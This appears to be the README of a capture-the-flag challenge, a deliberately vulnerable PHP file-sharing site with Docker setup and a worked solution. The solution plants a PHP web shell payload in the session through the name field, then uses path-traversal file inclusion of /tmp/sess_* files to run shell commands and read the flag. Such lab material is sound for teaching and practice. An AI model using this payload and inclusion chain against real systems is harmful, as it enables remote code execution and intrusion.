## Description

Try out my new file sharing site!  

		http://<address>

## Documentation

It's a pretty obvious LFI challenge but there isn't any way to actually upload files so you need to find a location you can read and write to.  The only way i've tried that works in this specific case is the php session files under /tmp/sess_*.  The apache access/error logs aren't readable to the php process so thats out.  The X-Powered-By header does specify that it is running PHP 7.3.15 and a contestant can look up the configuration to find the location of the session files because they are in the default location

### Setup

1. docker build . -t filestorage
2. docker run -p 80:80 filestorage

## Solution

1. Set your name to `<?php echo system($_GET["cmd"]); ?>`
2. Determine your PHPSESSID.  It can be found in your cookies.  
3. Look up the default php.ini for php 7.3.15 and determine that the default session location is /tmp/sess_*
4. Navigate to index.php?file=../../../../../tmp/sess_{your phpsessid}&cmd=ls%20/
5. Observe that there is a folder in the root named "flag_is_here".  Check the contents of this folder and then just execute "cat /flag_is_here/flag.txt"
